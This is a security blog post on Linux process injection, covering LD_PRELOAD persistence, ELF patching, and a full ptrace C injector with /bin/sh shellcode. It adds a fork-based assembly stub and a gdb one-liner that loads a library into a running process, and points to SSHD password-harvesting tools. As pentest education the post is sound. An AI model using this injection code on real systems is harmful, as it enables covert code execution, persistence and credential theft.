<!DOCTYPE html>
<html lang="en"  prefix="og: http://ogp.me/ns# fb: https://www.facebook.com/2008/fbml" >

<head>
    <title>Process Injection On Linux - jm33_ng</title>
    <!-- Using the latest rendering mode for IE -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">


    <link href="https://jm33.me/img/icon.png" rel="icon">

<link rel="canonical" href="https://jm33.me/process-injection-on-linux.html">

<meta name="author" content="jm33" />
<meta name="keywords" content="linux,injection" />
<meta name="description" content="See also Weaponized shared library injection Shellcode injection 101 Emp3r0r Dynamic Linker/Loader - Make an ELF load specific libraries Intro Strictly speaking, this is not the process injection you are expecting. Abusing ld.so can help you get your shared object (library) loaded in future processes the ELF file might …" />

<meta property="og:site_name" content="jm33_ng" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Process Injection On Linux" />
<meta property="og:url" content="https://jm33.me/process-injection-on-linux.html" />
<meta property="og:description" content="See also Weaponized shared library injection Shellcode injection 101 Emp3r0r Dynamic Linker/Loader - Make an ELF load specific libraries Intro Strictly speaking, this is not the process injection you are expecting. Abusing ld.so can help you get your shared object (library) loaded in future processes the ELF file might …" />
<meta property="article:published_time" content="2020-08-16" />
<meta property="article:section" content="Pentest" />
<meta property="article:tag" content="linux" />
<meta property="article:tag" content="injection" />
<meta property="article:author" content="jm33" />



    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://jm33.me/theme/css/bootstrap.sandstone.min.css" type="text/css" />
    <link href="https://jm33.me/theme/css/font-awesome.min.css" rel="stylesheet">

    <link href="https://jm33.me/theme/css/pygments/native.css" rel="stylesheet">
    <link rel="stylesheet" href="https://jm33.me/theme/css/style.css" type="text/css" />



    <!-- FontAwesome -->
    <!--  -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <!-- Noto Sans SC font -->
    <!--  -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
    <!-- Source Code Pro -->
    <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro&display=swap" rel="stylesheet">

    <!-- asciinema css -->
    <link rel="stylesheet" type="text/css" href="https://jm33.me/theme/css/asciinema-player.css" />

</head>

<body>

    <div class="navbar navbar-default navbar-fixed-top" role="navigation">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a href="https://jm33.me/" class="navbar-brand">
jm33_ng                </a>
            </div>
            <div class="collapse navbar-collapse navbar-ex1-collapse">
                <ul class="nav navbar-nav">
                        <li >
                            <a href="https://jm33.me/category/course-notes.html">Course notes</a>
                        </li>
                        <li >
                            <a href="https://jm33.me/category/misc.html">Misc</a>
                        </li>
                        <li class="active" >
                            <a href="https://jm33.me/category/pentest.html">Pentest</a>
                        </li>
                        <li >
                            <a href="https://jm33.me/category/programming.html">Programming</a>
                        </li>
                        <li >
                            <a href="https://jm33.me/category/tools.html">Tools</a>
                        </li>
                        <li >
                            <a href="https://jm33.me/category/vulnerabilities.html">Vulnerabilities</a>
                        </li>
                </ul>
                <ul class="nav navbar-nav navbar-right">
                </ul>
            </div>
            <!-- /.navbar-collapse -->
        </div>
    </div> <!-- /.navbar -->

    <!-- Banner -->
<style>
    #banner {
        background-image:url("https://jm33.me/img/banner.webp");
    }
</style>

<div id="banner">
    <div class="container">
        <div class="copy" style="border-radius: 4px">
            <h1>jm33_ng</h1>
            <br>
            <p class="intro"><s>cyber security</s> / noob <s>developer</s> / poor English</p>
        </div>
    </div>
</div>    <!-- End Banner -->

    <!-- Content Container -->
    <div class="container">
        <div class="row">
            <div class="col-sm-9">
<section id="content">
    <article>
        <header class="page-header">
            <h1>
                <a href="https://jm33.me/process-injection-on-linux.html" rel="bookmark" title="Permalink to Process Injection On Linux">
                    Process Injection On Linux
                </a>
            </h1>
        </header>
        <div class="entry-content">
            <div class="panel">
                <div class="panel-body">
<footer class="post-info">
    <span class="label label-default">Date</span>
    <span class="published">
        <i class="fa fa-calendar"></i><time datetime="2020-08-16T00:00:00+08:00"> Sun 16 August 2020</time>
    </span>





<span class="label label-default">Tags</span>
	<a href="https://jm33.me/tag/linux.html">linux</a>
        /
	<a href="https://jm33.me/tag/injection.html">injection</a>
    
</footer><!-- /.post-info -->                </div>
            </div>
            <nav class="toc">
                <h3>Table of Contents</h3>
                <div class="toc">
<ul>
<li><a href="#see-also">See also</a></li>
<li><a href="#dynamic-linkerloader-make-an-elf-load-specific-libraries">Dynamic Linker/Loader - Make an ELF load specific libraries</a><ul>
<li><a href="#intro">Intro</a></li>
<li><a href="#preload-libraries">Preload libraries</a></li>
<li><a href="#patch-elfs-with-additional-libraries">Patch ELFs with additional libraries</a></li>
<li><a href="#run-time-shared-library-injection">Run-time shared library injection</a></li>
</ul>
</li>
<li><a href="#ptrace">PTRACE</a><ul>
<li><a href="#ptrace_poketext-ptrace_pokedata">PTRACE_POKETEXT / PTRACE_POKEDATA</a></li>
<li><a href="#execute-shellcode">Execute shellcode</a><ul>
<li><a href="#inject-shellcode-into-rip-pointed-address">Inject shellcode into RIP-pointed address</a></li>
<li><a href="#inject-without-crashing-the-process">Inject without crashing the process</a></li>
<li><a href="#load-an-external-library">Load an external library</a></li>
</ul>
</li>
<li><a href="#weaponize">Weaponize</a></li>
</ul>
</li>
</ul>
</div>
            </nav>
            <hr><br>
            <p><img alt="banner" src="/img/linux-inject/linux-inject.webp"/></p>

<h1 id="see-also">See also</h1>
<ul>
<li><a href="https://jm33.me/emp3r0r-injection.html">Weaponized shared library injection</a></li>
<li><a href="https://jm33.me/emp3r0r-process-injection-and-persistence.html">Shellcode injection 101</a></li>
<li><a href="https://github.com/jm33-m0/emp3r0r">Emp3r0r</a></li>
</ul>
<h1 id="dynamic-linkerloader-make-an-elf-load-specific-libraries">Dynamic Linker/Loader - Make an ELF load specific libraries</h1>
<h2 id="intro">Intro</h2>
<p>Strictly speaking, this is not the process injection you are expecting. Abusing <code>ld.so</code> can help you get your shared object (library) loaded in future processes the ELF file might create. In other words, it helps you get persistence.</p>
<blockquote>
<p>The programs <code>ld.so</code> and <code>ld-linux.so*</code> find and load the shared objects (shared libraries) needed by a program,prepare the program to run, and then run it.
Linux binaries require dynamic linking (linking at run time) unless the <code>-static</code> option was given to ld(1) during compilation.
The program <code>ld.so</code> handles <code>a.out</code> binaries, a binary format used long ago. The program <code>ld-linux.so*</code> (<code>/lib/ld-linux.so.1</code> for libc5, <code>/lib/ld-linux.so.2</code> for glibc2) handles binaries that are in the more modern ELF format. Both programs have the same behavior, and use the same support files and programs (ldd(1), ldconfig(8), and /etc/ld.so.conf).</p>
</blockquote>
<p>In essence, <code>ld.so</code> or the dynamic linker/loader is responsible for linking run-time libraries (shared objects), almost every binary found in a modern Linux system is dynamically linked against multiple C libraries, and you can view/modify the required libraries by modifying the <code>DT_NEEDED</code> entry in the ELF file.</p>
<h2 id="preload-libraries">Preload libraries</h2>
<p><code>LD_PRELOAD</code> is the most common technique used by linux malware, it tells the ld loader to load a specific shared object before anything else.</p>
<p><img alt="ld preload" src="./img/linux-inject/ld_preload.webp"/></p>
<p>You can also set preload library in <code>/etc/ld.so.preload</code>.</p>
<h2 id="patch-elfs-with-additional-libraries">Patch ELFs with additional libraries</h2>
<blockquote>
<p><code>DT_NEEDED</code>
This element holds the string table offset of a null-terminated string, giving the name of a needed library. The offset is an index into the table recorded in the <code>DT_STRTAB</code> code. See 'Shared Object Dependencies' for more information about these names. The dynamic array may contain multiple entries with this type. These entries' relative order is significant, though their relation to entries of other types is not.</p>
</blockquote>
<p>Like said above, you can modify <code>DT_NEEDED</code> entry in an ELF file in order to let it load additional libraries when executed.</p>
<p>There's handy tool developed specifically for this purpose: <a href="https://github.com/NixOS/patchelf"><code>patchelf</code></a>.</p>
<div class="highlight"><pre><span></span><code>patchelf<span class="w"> </span>--add-needed<span class="w"> </span>libfoo.so.1<span class="w"> </span>my-program
</code></pre></div>
<h2 id="run-time-shared-library-injection">Run-time shared library injection</h2>
<p>This works like classic DLL injection on Windows. You can find details <a href="https://jm33.me/emp3r0r-injection.html">here</a></p>
<h1 id="ptrace">PTRACE</h1>
<h2 id="ptrace_poketext-ptrace_pokedata">PTRACE_POKETEXT / PTRACE_POKEDATA</h2>
<blockquote>
<p>Copy the word data to the address addr in the tracee's memory. As for PTRACE_PEEKTEXT and
PTRACE_PEEKDATA, these two requests are currently equivalent.</p>
</blockquote>
<p><code>POKETEXT</code> modifies the tracee's memory, so we can put our shellcode there, then find a way to execute it</p>
<h2 id="execute-shellcode">Execute shellcode</h2>
<h3 id="inject-shellcode-into-rip-pointed-address">Inject shellcode into RIP-pointed address</h3>
<p>By injecting shellcode into current RIP-pointed address, our code gets run as long as we send a <code>SIGCONT</code> (with <code>PTRACE_CONT</code> or <code>PTRACE_DETATCH</code>).</p>
<p>But doing so causes the tracee to crash afterwards if we don't restore its previous state</p>
<p>Theres a great article that covers this method: <a href="https://0x00sec.org/t/linux-infecting-running-processes/1097">https://0x00sec.org/t/linux-infecting-running-processes/1097</a></p>
<p>Here's <a href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">his code</a>, I have added some comments and corrected some typo:</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>

<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/ptrace.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/wait.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>

<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/reg.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/user.h&gt;</span>

<span class="cp">#define SHELLCODE_SIZE 32</span>

<span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">shellcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"</span><span class="se">\x48\x31\xc0\x48\x89\xc2\x48\x89</span><span class="s">"</span>
<span class="w">                           </span><span class="s">"</span><span class="se">\xc6\x48\x8d\x3d\x04\x00\x00\x00</span><span class="s">"</span>
<span class="w">                           </span><span class="s">"</span><span class="se">\x04\x3b\x0f\x05\x2f\x62\x69\x6e</span><span class="s">"</span>
<span class="w">                           </span><span class="s">"</span><span class="se">\x2f\x73\x68\x00\xcc\x90\x90\x90</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">inject_data</span><span class="p">(</span><span class="kt">pid_t</span><span class="w"> </span><span class="n">pid</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">src</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">dst</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
<span class="w">    </span><span class="kt">uint32_t</span><span class="o">*</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)</span><span class="n">src</span><span class="p">;</span>
<span class="w">    </span><span class="kt">uint32_t</span><span class="o">*</span><span class="w"> </span><span class="n">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)</span><span class="n">dst</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// The PTRACE_POKETEXT function works on words,</span>
<span class="w">    </span><span class="c1">// so we convert everything to word pointers (32bits) and we also increase i by 4.</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="o">++</span><span class="p">,</span><span class="w"> </span><span class="n">d</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKETEXT</span><span class="p">,</span><span class="w"> </span><span class="n">pid</span><span class="p">,</span><span class="w"> </span><span class="n">d</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">s</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">perror</span><span class="p">(</span><span class="s">"ptrace(POKETEXT):"</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
<span class="w">    </span><span class="kt">pid_t</span><span class="w"> </span><span class="n">target</span><span class="p">;</span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">user_regs_struct</span><span class="w"> </span><span class="n">regs</span><span class="p">;</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">syscall</span><span class="p">;</span>
<span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">dst</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="s">"Usage:</span><span class="se">\n\t</span><span class="s">%s pid</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"+ Tracing process %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_ATTACH</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">"ptrace(ATTACH):"</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"+ Waiting for process...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="w">    </span><span class="n">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"+ Getting Registers</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">regs</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">"ptrace(GETREGS):"</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="cm">/* Inject code into current RIP position */</span>
<span class="w">    </span><span class="c1">// this will execute the shellcode but leave the tracee in a dead state</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"+ Injecting shell code at %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">regs</span><span class="p">.</span><span class="n">rip</span><span class="p">);</span>
<span class="w">    </span><span class="n">inject_data</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="n">shellcode</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">regs</span><span class="p">.</span><span class="n">rip</span><span class="p">,</span><span class="w"> </span><span class="n">SHELLCODE_SIZE</span><span class="p">);</span>

<span class="w">    </span><span class="n">regs</span><span class="p">.</span><span class="n">rip</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"> </span><span class="c1">// PTRACE_DEATCH subtracts 2 bytes to the Instruction Pointer</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"+ Setting instruction pointer to %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">regs</span><span class="p">.</span><span class="n">rip</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">regs</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">"ptrace(GETREGS):"</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"+ Run it!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// the shellcode will be run (as it's pointed by RIP) after detaching</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">"ptrace(DETACH):"</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="inject-without-crashing-the-process">Inject without crashing the process</h3>
<p>From <a href="http://phrack.org/issues/59/12.html">phrack</a>:</p>
<blockquote>
<p>I've seen some injection mechanism used by some ptrace() exploits for
linux, which injected a standard shellcode into the memory area pointed
by %eip. That's the lazy way of doing injection, since the target process
is screwed up and can't be used again. (crashes or doesn't fork)
We have to find another way to execute our code in the target process.
That's what I was thinking and I found this :</p>
<p>1- Get the current eip of the process, and the esp.
2- Decrement esp by four
3- Poke eip address at the esp address.
4- Inject the shellcode into esp - 1024 address (Not directly
before the space pointed by esp, because some shellcodes
use the push instruction)
5- Set register eip as the value of esp - 1024
6- Invoke the SETREGS method of ptrace
7- Detach the process and let it open a root shell for you :)</p>
</blockquote>
<p>This method injects a shellcode that forks a new child process, then inject the real shellcode into it</p>
<p>It has obvious advantage, it runs shellcode in a child process, without affecting the father (the tracee, the process that we inject code into)</p>
<p>The caveat, I assume, is that the child process might be noticeable</p>
<blockquote>
<p>The pusha saves all the registers on the stack, so the process may restore
them just after the fork. (I say eax and ebx)
If the return value of fork is zero, this is the son being executed.
There we insert any style of shellcode.
If the return value is not zero (but a pid), restore the registers and the
previously saved eip. The program may continue as if nothing has happened.</p>
</blockquote>
<p>The first two <code>nop</code>s are due to the same reason that i mentioned: <code>PTRACE_DETATCH</code> subtracts 2 bytes to the Instruction Pointer</p>
<p>compile the following demo with <code>gcc -c s1.S</code>, you are going to inject this shellcode to your target process</p>
<div class="highlight"><pre><span></span><code><span class="c1">// all that part has to be done into the injected process</span>
<span class="c1">// in other word, this is the injected shellcode</span>
<span class="na">.globl</span><span class="w"> </span><span class="no">injected_shellcode</span>

<span class="nl">injected_shellcode:</span>
<span class="w">    </span><span class="c1">// ret location has been pushed previously</span>
<span class="w">    </span><span class="nf">nop</span>
<span class="w">    </span><span class="nf">nop</span>
<span class="w">    </span><span class="nf">pusha</span><span class="w">          </span><span class="c1">// save before anything</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nv">%eax</span><span class="p">,</span><span class="w"> </span><span class="nv">%eax</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">$0x02</span><span class="p">,</span><span class="w"> </span><span class="nv">%al</span><span class="w"> </span><span class="c1">// sys_fork</span>
<span class="w">    </span><span class="nf">int</span><span class="w"> </span><span class="no">$0x80</span><span class="w">      </span><span class="c1">// fork()</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nv">%ebx</span><span class="p">,</span><span class="w"> </span><span class="nv">%ebx</span>
<span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="nv">%eax</span><span class="p">,</span><span class="w"> </span><span class="nv">%ebx</span><span class="w"> </span><span class="c1">// father or son ?</span>
<span class="w">    </span><span class="nf">je</span><span class="w">  </span><span class="no">son</span><span class="w">        </span><span class="c1">// I'm son</span>

<span class="w">    </span><span class="c1">// here, I'm the father, I've to restore my previous state</span>
<span class="nl">father:</span>
<span class="w">    </span><span class="nf">popa</span>
<span class="w">    </span><span class="nf">ret</span><span class="w">  </span><span class="c1">// return address has been pushed on the stack previously</span>

<span class="c1">// code finished for father</span>

<span class="nl">son:</span><span class="w">  </span><span class="c1">// standard shellcode, at your choice</span>
<span class="w">    </span><span class="na">.string</span><span class="w"> </span><span class="s">""</span>
</code></pre></div>
<p>See also <a href="https://jm33.me/emp3r0r-process-injection-and-persistence.html">Shellcode injection 101</a></p>
<h3 id="load-an-external-library">Load an external library</h3>
<p>This approach needs <code>dlopen</code> or something similar, basically we need to inject shellcode to run <code>dlopen</code> then load our shared object (library)</p>
<p><a href="https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html">Using gdb to load a library</a> is a much better choice</p>
<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">'print __libc_dlopen_mode("/path/to/library.so", 2)'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>gdb<span class="w"> </span>-p<span class="w"> </span>&lt;PID&gt;
</code></pre></div>
<p>The library gets loaded into the running PID immediately, and your code gets executed</p>
<p>You can upload a statically-linked gdb binary and try your luck</p>
<p>See also <a href="https://jm33.me/emp3r0r-injection.html">Weaponized shared library injection</a></p>
<h2 id="weaponize">Weaponize</h2>
<p>SSHD inject and password harvesting</p>
<ul>
<li>See <a href="https://github.com/xpn/ssh-inject">XPN's ssh-inject tool</a>, he has <a href="https://blog.xpnsec.com/linux-process-injection-aka-injecting-into-sshd-for-fun/">an article</a> about this, too</li>
<li><a href="/sshd-injection-and-password-harvesting.html">My own approach</a></li>
</ul>
        </div>
        <!-- /.entry-content -->
    <hr/>
    <section class="comments" id="comments">
        <h2>Comments</h2>

        <div id="disqus_thread"></div>
        <script type="text/javascript">
            /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
            var disqus_shortname = 'jm33-m0'; // required: replace example with your forum shortname

            var disqus_config = function () {
                this.language = "en";

                        this.page.url = 'https://jm33.me/process-injection-on-linux.html';
            };

            /* * * DON'T EDIT BELOW THIS LINE * * */
            (function () {
                var dsq = document.createElement('script');
                dsq.type = 'text/javascript';
                dsq.async = true;
                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
            Disqus.</a></noscript>
        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

    </section>
    </article>
</section>

            </div>
            <div class="col-sm-3" id="sidebar">
                <aside>
<div id="aboutme">
    <p>
        <img width="100%" class="img-thumbnail" src="https://jm33.me//img/profile.webp" />
    </p>
     <p>
        <strong>About jm33</strong><br />
        
<h3>Who</h3>
<ul>
<li>
    <p><strong><a href="/pages/jing-mi.html" target="_blank">Cyber Security Researcher</a></strong></p>
</li>
</ul>
<h3>Contact</h3>
<ul>
<li>
    <p><strong><a href="/pages/gpg.html" target="_blank" title="My GPG public key, I'm sure you can find my email addresses in it">0x3A5DBF07</a></strong></p>
</li>
<li>
    <p><strong><a rel="me" href="https://infosec.exchange/@jm33">Mastodon</a></strong></p>
</li>
<li>
    <p><strong><a href="https://jm33.me/pages/got-something-to-say.html" target="_blank">Leave a message</a></strong></p>
</li>
</ul>

    </p>
</div><!-- Sidebar -->
<section class="well well-sm">
    <ul class="list-group list-group-flush">

<!-- Sidebar/Social -->
<li class="list-group-item">
  <h4><i class="fa fa-home fa-lg"></i><span class="icon-label">Social</span></h4>
  <ul class="list-group" id="social">
    <li class="list-group-item"><a href="https://twitter.com/jm33_m0"><i class="fa fa-twitter-square fa-lg"></i> Twitter</a></li>
    <li class="list-group-item"><a href="https://github.com/jm33-m0"><i class="fa fa-github-square fa-lg"></i> GitHub</a></li>
    <li class="list-group-item"><a href="https://www.linkedin.com/in/jm33m0"><i class="fa fa-linkedin-square fa-lg"></i> LinkedIn</a></li>
    <li class="list-group-item"><a href="https://stackoverflow.com/users/5230333/jm33-m0"><i class="fa fa-stack-overflow fa-lg"></i> StackOverflow</a></li>
  </ul>
</li>
<!-- End Sidebar/Social -->

<!-- Sidebar/Recent Posts -->
<li class="list-group-item">
  <h4><i class="fa fa-home fa-lg"></i><span class="icon-label">Recent Posts</span></h4>
  <ul class="list-group" id="recentposts">
    <li class="list-group-item"><a href="https://jm33.me/my-2024.html">My 2024</a></li>
    <li class="list-group-item"><a href="https://jm33.me/reversing-a-go-malware-using-ghidra.html">Reversing a Go Malware Using Ghidra</a></li>
    <li class="list-group-item"><a href="https://jm33.me/secure-boot-in-arch-linux.html">Secure Boot in Arch Linux</a></li>
    <li class="list-group-item"><a href="https://jm33.me/openssh-server-mi-ma-shou-ge-ji.html">OpenSSH Server 密码收割机</a></li>
    <li class="list-group-item"><a href="https://jm33.me/migrating-from-libvirt-to-qemu.html">Migrating from Libvirt to Qemu</a></li>
  </ul>
</li>
<!-- End Sidebar/Recent Posts -->

<!-- Sidebar/Tag Cloud -->
<li class="list-group-item">
  <a href="https://jm33.me/tags.html"><h4><i class="fa fa-tags fa-lg"></i><span class="icon-label">Tags</span></h4></a>
  <ul class="list-group list-inline tagcloud" id="tags">
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/2024.html">2024</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/404.html">404</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/443.html">443</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/active-directory.html">active directory</a>
    </li>
